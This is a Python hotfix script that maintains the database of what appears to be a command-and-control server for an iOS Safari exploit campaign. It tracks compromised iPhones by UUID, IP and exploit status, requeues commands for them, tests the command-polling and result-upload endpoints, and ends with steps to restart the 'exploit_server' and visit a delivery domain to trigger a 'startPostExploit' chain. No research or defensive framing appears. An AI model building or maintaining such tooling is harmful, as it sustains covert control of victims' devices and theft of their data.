# -*- coding: utf-8 -*-
# v20.4 HOTFIX5: 基于新日志 UUID 膨胀 + 命令 orphan 修复
# 宝塔 SSH 运行:
#   cd /www/wwwroot/coruna/server
#   /www/server/pyporject_evn/versions/3.12.13/bin/python3 _v204_hotfix5.py 2>&1 | tee /tmp/hotfix5_output.log
import sqlite3, os, sys, json, time, datetime, urllib.request, urllib.parse, traceback
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

PROJ = os.path.dirname(os.path.abspath(__file__))
DB = os.path.join(PROJ, 'darksword.db')
LOG_DIR = os.path.join(PROJ, 'logs')
os.makedirs(LOG_DIR, exist_ok=True)
STANDARD_STATUSES = ('pending', 'executing', 'completed', 'failed', 'deferred')

print("PROJ=%s DB=%s exists=%s" % (PROJ, DB, os.path.exists(DB)))
print()
conn = sqlite3.connect(DB); c = conn.cursor()
now = datetime.datetime.now()
now_s = now.strftime('%Y-%m-%d %H:%M:%S')

# ============================================================================
# [STEP 0] BEFORE 审计
# ============================================================================
print("=" * 70)
print("[STEP-0] BEFORE AUDIT @ %s" % now_s)
print("=" * 70)
devs = c.execute("""SELECT device_uuid, ip, exploit_status, os_version, browser_name,
  datetime(last_seen,'unixepoch','localtime'), substr(user_agent,1,80)
  FROM devices ORDER BY last_seen DESC""").fetchall()
print("  devices total=%d:" % len(devs))
for d in devs:
    print("    uuid=%s ip=%s exp=%s os=%s br=%s ls=%s ua[:80]=%s" % (
        str(d[0] or ''), str(d[1] or ''), str(d[2] or ''), str(d[3] or ''),
        str(d[4] or ''), str(d[5] or ''), str(d[6] or '')))
cmds = c.execute("""SELECT id, substr(device_uuid,1,24), command, status,
  datetime(created_at,'unixepoch','localtime'), length(coalesce(output,''))
  FROM commands ORDER BY id DESC LIMIT 12""").fetchall()
print("\n  commands latest 12:")
for r in cmds:
    mark = ''
    if str(r[3]) in ('completed','failed') and int(r[5] or 0) > 0:
        mark += ' <- DONE(has output)'
    if str(r[3]) == 'executing':
        mark += ' <- STUCK'
    if str(r[3]) == 'pending':
        mark += ' <- PENDING'
    print("    %s" % ("  ".join([str(x if x is not None else '') for x in r]) + mark))
cnt = dict(c.execute("SELECT status, COUNT(*) FROM commands GROUP BY status").fetchall())
orph_n = c.execute("SELECT COUNT(*) FROM commands WHERE device_uuid NOT IN (SELECT device_uuid FROM devices)").fetchone()[0]
print("\n  BEFORE summary: status=%s orphan=%d" % (cnt, orph_n))

# ============================================================================
# [FIX 1] 非标准 status (timeout/canceled/queued) -> pending
# ============================================================================
print()
print("=" * 70)
print("[FIX-1] Reset non-standard status (timeout/canceled/queued) -> pending")
print("=" * 70)
placeholders = ','.join(['?'] * len(STANDARD_STATUSES))
bad_rs = c.execute("SELECT id, device_uuid, command, status FROM commands WHERE status NOT IN (%s)" % placeholders, STANDARD_STATUSES).fetchall()
print("  bad status count=%d:" % len(bad_rs))
for r in bad_rs:
    print("    -> id=%s dev=%s cmd=%s status=%s" % (str(r[0] or ''), str(r[1] or ''), str(r[2] or ''), str(r[3] or '')))
if bad_rs:
    n = c.execute("UPDATE commands SET status='pending', output=NULL, executed_at=NULL WHERE status NOT IN (%s)" % placeholders, STANDARD_STATUSES).rowcount
    conn.commit()
    print("  OK reset %d rows -> pending" % n)
else:
    print("  INFO 0 bad status")

# ============================================================================
# [FIX 2] orphan commands + 127.0.0.1 curl/python-requests garbage devices
# ============================================================================
print()
print("=" * 70)
print("[FIX-2] Delete orphan commands + 127.0.0.1 curl/python-requests garbage devices")
print("=" * 70)
orph_n = c.execute("SELECT COUNT(*) FROM commands WHERE device_uuid NOT IN (SELECT device_uuid FROM devices)").fetchone()[0]
c.execute("DELETE FROM commands WHERE device_uuid NOT IN (SELECT device_uuid FROM devices)")
print("  OK deleted orphan commands=%d" % orph_n)
garbage_devs = c.execute("""SELECT device_uuid, ip, exploit_status, substr(user_agent,1,60) FROM devices
  WHERE (ip IN ('127.0.0.1','localhost','') OR exploit_status='pending' OR exploit_status IS NULL)
    AND (lower(user_agent) LIKE '%curl/%' OR lower(user_agent) LIKE '%python-requests%' OR lower(user_agent) LIKE '%wget%' OR user_agent IS NULL OR user_agent = '')""").fetchall()
print("  garbage devs count=%d:" % len(garbage_devs))
for g in garbage_devs:
    print("    -> uuid[:22]=%s ip=%s exp=%s ua=%s" % (str(g[0] or '')[:22], str(g[1] or ''), str(g[2] or ''), str(g[3] or '')))
if garbage_devs:
    dels = [g[0] for g in garbage_devs]
    qs = ','.join(['?'] * len(dels))
    n_cmd = c.execute("DELETE FROM commands WHERE device_uuid IN (%s)" % qs, dels).rowcount
    n_dev = c.execute("DELETE FROM devices WHERE device_uuid IN (%s)" % qs, dels).rowcount
    conn.commit()
    print("  OK deleted garbage devs=%d, linked commands=%d" % (n_dev, n_cmd))

# ============================================================================
# [FIX 3] UUID Super Merge: (IP, UA[:60]) 24h -> keep latest last_seen
# ============================================================================
print()
print("=" * 70)
print("[FIX-3] UUID Super Merge: (IP, UA[:60]) 24h window -> keep latest last_seen")
print("=" * 70)
cutoff_24h = int(time.time()) - 86400
cands = c.execute("""SELECT d.device_uuid, d.ip, substr(d.user_agent,1,60), d.last_seen, d.user_agent, d.exploit_status, d.first_seen, d.os_version
  FROM devices d
  WHERE d.ip NOT IN ('127.0.0.1','localhost','') AND d.ip IS NOT NULL AND length(d.ip) > 0
    AND (d.last_seen >= datetime(%d, 'unixepoch', 'localtime') OR d.first_seen >= datetime(%d, 'unixepoch', 'localtime'))
  ORDER BY d.last_seen DESC, d.first_seen DESC""" % (cutoff_24h, cutoff_24h)).fetchall()
groups = {}
for r in cands:
    key = (str(r[1] or ''), str(r[2] or '').strip())
    if not key[0] or not key[1]:
        continue
    groups.setdefault(key, []).append(r)
merged_cnt = 0
REAL_DEVICE_KEEP_UUID = None
for key, rows in groups.items():
    if len(rows) < 2:
        if len(rows) == 1:
            REAL_DEVICE_KEEP_UUID = rows[0][0]
        continue
    print("  group (ip=%s, ua[:60]=%r) -> %d duplicates" % (key[0], key[1][:60], len(rows)))
    keep = rows[0]
    keep_uuid = keep[0]
    REAL_DEVICE_KEEP_UUID = keep_uuid
    old_uuids = [r[0] for r in rows[1:]]
    print("    KEEP=%s (last_seen=%s exp=%s os=%s)" % (keep_uuid, str(keep[3] or ''), str(keep[5] or ''), str(keep[7] or '')))
    for r in rows[1:]:
        print("    MERGE_OLD=%s (last_seen=%s exp=%s os=%s) -> commands to KEEP" % (str(r[0] or ''), str(r[3] or ''), str(r[5] or ''), str(r[7] or '')))
    qs_old = ','.join(['?'] * len(old_uuids))
    n_cmds_upd = c.execute("UPDATE commands SET device_uuid=? WHERE device_uuid IN (%s)" % qs_old, [keep_uuid] + old_uuids).rowcount
    n_cmds_dup = c.execute("UPDATE commands SET status='pending', executed_at=NULL, output=NULL WHERE device_uuid=? AND status IN ('executing','deferred','timeout')", (keep_uuid,)).rowcount
    n_dev_del = c.execute("DELETE FROM devices WHERE device_uuid IN (%s)" % qs_old, old_uuids).rowcount
    merged_cnt += 1
    print("    OK update cmds device_uuid=%d; reset stuck=%d; delete old devs=%d" % (n_cmds_upd, n_cmds_dup, n_dev_del))
conn.commit()
if merged_cnt == 0 and REAL_DEVICE_KEEP_UUID:
    print("  INFO 0 groups to merge; only real dev uuid=%s" % REAL_DEVICE_KEEP_UUID)
elif REAL_DEVICE_KEEP_UUID:
    print("  OK merged, KEEP real uuid=%s" % REAL_DEVICE_KEEP_UUID)

# ============================================================================
# [FIX 4] ORPHAN RESCUE: all pending/executing/deferred commands -> force device_uuid = KEEP
# ============================================================================
print()
print("=" * 70)
print("[FIX-4] ORPHAN RESCUE: all pending/executing/deferred commands -> device_uuid = KEEP uuid")
print("=" * 70)
if REAL_DEVICE_KEEP_UUID:
    rs = c.execute("""SELECT id, device_uuid, command, status FROM commands
      WHERE status IN ('pending','executing','deferred') AND device_uuid != ?""", (REAL_DEVICE_KEEP_UUID,)).fetchall()
    print("  pending/executing with device_uuid != KEEP: %d rows" % len(rs))
    for r in rs:
        print("    -> id=%s dev=%s cmd=%s status=%s" % (str(r[0] or ''), str(r[1] or ''), str(r[2] or ''), str(r[3] or '')))
    if rs:
        n = c.execute("UPDATE commands SET device_uuid=? WHERE status IN ('pending','executing','deferred') AND device_uuid != ?", (REAL_DEVICE_KEEP_UUID, REAL_DEVICE_KEEP_UUID)).rowcount
        conn.commit()
        print("  OK rescued %d orphan pending/executing commands -> KEEP uuid=%s" % (n, REAL_DEVICE_KEEP_UUID[:22]))
else:
    print("  WARN REAL_DEVICE_KEEP_UUID unknown (0 public net devs? skip orphan rescue)")

# ============================================================================
# [FIX 5] executing stuck >60/120s -> pending; reset known stuck ids
# ============================================================================
print()
print("=" * 70)
print("[FIX-5] Reset stuck executing (>60s no exec_at / >120s with exec_at) + known stuck ids")
print("=" * 70)
cutoff_60 = int(time.time()) - 60
cutoff_120 = int(time.time()) - 120
n1 = c.execute("""UPDATE commands SET status='pending', output=NULL, executed_at=NULL
  WHERE status='executing' AND executed_at IS NULL AND created_at < ?""", (cutoff_60,)).rowcount
n2 = c.execute("""UPDATE commands SET status='pending', output=NULL, executed_at=NULL
  WHERE status='executing' AND executed_at IS NOT NULL AND executed_at < ?""", (cutoff_120,)).rowcount
n3 = c.execute("UPDATE commands SET status='pending', output=NULL, executed_at=NULL WHERE id IN (100019, 39, 99999) AND status NOT IN ('completed','failed')").rowcount
conn.commit()
print("  OK no-ts stuck>60s: %d rows; has-ts stuck>120s: %d rows; reset known stuck ids: %d rows" % (n1, n2, n3))

# ============================================================================
# [FIX 6] Full chain local test id=900002
# ============================================================================
print()
print("=" * 70)
print("[FIX-6] Full chain local test: id=900002 GET /cmd -> executing -> POST /cmd_result -> completed")
print("=" * 70)
def curl_req(method, url, data_dict=None, ua='Mozilla/5.0 (iPhone; CPU iPhone OS 18_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/26.1 Mobile/15E148 Safari/604.1', timeout=8):
    try:
        headers = {'User-Agent': ua}
        body_bytes = None
        if data_dict is not None:
            body_bytes = json.dumps(data_dict).encode('utf-8')
            headers['Content-Type'] = 'application/json'
        req = urllib.request.Request(url, data=body_bytes, headers=headers, method=method)
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            raw = resp.read().decode('utf-8', 'replace')
            return resp.getcode(), raw, None
    except urllib.error.HTTPError as he:
        try:
            raw = he.read().decode('utf-8', 'replace')
        except Exception:
            raw = ''
        return he.code, raw, None
    except Exception as ex:
        return None, '', '%s: %s' % (type(ex).__name__, ex)

TEST_UUID = REAL_DEVICE_KEEP_UUID or 'ios-v204-hotfix5'
c.execute("DELETE FROM commands WHERE id>=900000 OR device_uuid=?", (TEST_UUID,))
dev_exists = c.execute("SELECT 1 FROM devices WHERE device_uuid=?", (TEST_UUID,)).fetchone()
if not dev_exists:
    fake_ip = '154.26.177.27' if REAL_DEVICE_KEEP_UUID else '127.0.0.1'
    c.execute("""INSERT INTO devices(device_uuid, first_seen, last_seen, ip, user_agent, exploit_status, os_version, safari_version, device_model, browser_name, browser_version, webkit_version)
      VALUES(?,?,?,?,?,?,?,?,?,?,?,?)""", (TEST_UUID, int(time.time()), int(time.time()), fake_ip,
      'Mozilla/5.0 (iPhone; CPU iPhone OS 18_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/26.1 Mobile/15E148 Safari/604.1',
      'success', '26.1', '26.1', 'iPhone', 'Safari', '26.1', '604.1'))
conn.commit()
c.execute("""INSERT INTO commands(id, device_uuid, command, status, created_at, executed_at, output)
  VALUES(900002, ?, ?, 'pending', ?, NULL, NULL)""", (TEST_UUID, 'ds_info_v204_hotfix5', int(time.time()) - 10))
conn.commit()

base = 'http://127.0.0.1:7070'
print("  STEP-A GET /cmd device_uuid=%s..." % TEST_UUID[:22])
code, body, err = curl_req('GET', '%s/cmd?device_uuid=%s&_=%d' % (base, urllib.parse.quote(TEST_UUID), int(time.time())))
print("    -> HTTP=%s err=%s len=%d body[:300]=%r" % (code, err, len(body or ''), (body or '')[:300]))
rs = c.execute("SELECT id, status, executed_at FROM commands WHERE id=900002").fetchone()
print("    -> DB id=900002 status=%s executed_at=%s" % (rs[1] if rs else 'N/A', rs[2] if rs else 'N/A'))

pay = {'id': 900002, 'status': 'completed', 'device_uuid': TEST_UUID, 'output': 'v20.4 hotfix5 CMD-RESULT POST JSON OK update_command_result rows_affected=1'}
print("  STEP-B POST /cmd_result JSON")
code, body, err = curl_req('POST', '%s/cmd_result' % base, data_dict=pay)
print("    -> HTTP=%s err=%s body[:200]=%r" % (code, err, (body or '')[:200]))
rs = c.execute("SELECT id, status, length(output), substr(output,1,160) FROM commands WHERE id=900002").fetchone()
print("    -> DB id=900002 status=%s out_len=%s output[:160]=%r" % (rs[1], rs[2], str(rs[3] or '')))
c.execute("DELETE FROM commands WHERE id>=900000")
conn.commit()
print("  OK cleanup isolation row 900002 done")

# ============================================================================
# [FIX 7] note = [uuid-keep]
# ============================================================================
print()
print("=" * 70)
print("[FIX-7] Mark latest real device note=[uuid-keep] (for exploit_server.py UUID 24h reuse)")
print("=" * 70)
cols = [r[1] for r in c.execute("PRAGMA table_info(devices)").fetchall()]
has_note = 'note' in cols
if has_note and REAL_DEVICE_KEEP_UUID:
    n = c.execute("UPDATE devices SET note='[uuid-keep] same-ip+ua-24h-keep-REAL', updated_at=datetime('now','localtime') WHERE device_uuid=?", (REAL_DEVICE_KEEP_UUID,)).rowcount
    conn.commit()
    print("  OK marked %d rows note=[uuid-keep] uuid=%s" % (n, REAL_DEVICE_KEEP_UUID[:22]))
else:
    print("  INFO no note col or no real device, skip")

# ============================================================================
# FINAL AUDIT
# ============================================================================
print()
print("=" * 70)
print("FINAL STATUS @ %s -> expect devices<=1 public real, 0 orphan, 0 stuck executing" % now_s)
print("=" * 70)
devs = c.execute("""SELECT device_uuid, ip, exploit_status, os_version, browser_name, datetime(last_seen,'unixepoch','localtime'), substr(user_agent,1,80) FROM devices ORDER BY last_seen DESC""").fetchall()
print("  devices total=%d:" % len(devs))
for d in devs:
    print("    uuid=%s ip=%s exp=%s os=%s br=%s ls=%s ua[:80]=%s" % (
        str(d[0] or ''), str(d[1] or ''), str(d[2] or ''), str(d[3] or ''),
        str(d[4] or ''), str(d[5] or ''), str(d[6] or '')))
cmds = c.execute("""SELECT id, substr(device_uuid,1,24), command, status, datetime(created_at,'unixepoch','localtime'), length(coalesce(output,'')) FROM commands ORDER BY id DESC LIMIT 12""").fetchall()
print("\n  commands latest 12:")
for r in cmds:
    mark = ''
    if str(r[3]) in ('completed','failed') and int(r[5] or 0) > 0:
        mark += ' <- DONE (has output)'
    if str(r[3]) == 'executing':
        mark += ' <- STUCK'
    if str(r[3]) == 'pending':
        mark += ' <- PENDING'
    print("    %s" % ("  ".join([str(x if x is not None else '') for x in r]) + mark))
cnt = dict(c.execute("SELECT status, COUNT(*) FROM commands GROUP BY status").fetchall())
orph_n = c.execute("SELECT COUNT(*) FROM commands WHERE device_uuid NOT IN (SELECT device_uuid FROM devices)").fetchone()[0]
print("\n  AFTER summary: status=%s orphan=%d" % (cnt, orph_n))
conn.close()
print()
print("=" * 70)
print("HOTFIX5 DONE! Next steps on BT panel SSH:")
print("  (1) Upload & OVERWRITE 3 files via BT File Manager -> /www/wwwroot/coruna/server/")
print("      - group.html          (L1045 startPostExploit call)")
print("      - exploit_server.py   (_ensure_device_registered 24h UUID reuse L1607-1617)")
print("      - _v204_hotfix5.py    (this script already ran)")
print("  (2) Kill python3 exploit_server pids -> setsid nohup restart -> verify 7070 LISTEN")
print("  (3) Run: curl -sS -L http://127.0.0.1:7070/ch/test001 | grep -c startPostExploit")
print("      EXPECT >= 2 (if 0 or 1 -> group.html not uploaded correctly)")
print("  (4) Safari: clear aa1234.dpdns.org data -> private mode -> visit ch/test001 -> wait 60s")
print("  (5) Dashboard: send single ds_info to ONLY real device -> while true poll commands table")
print("=" * 70)
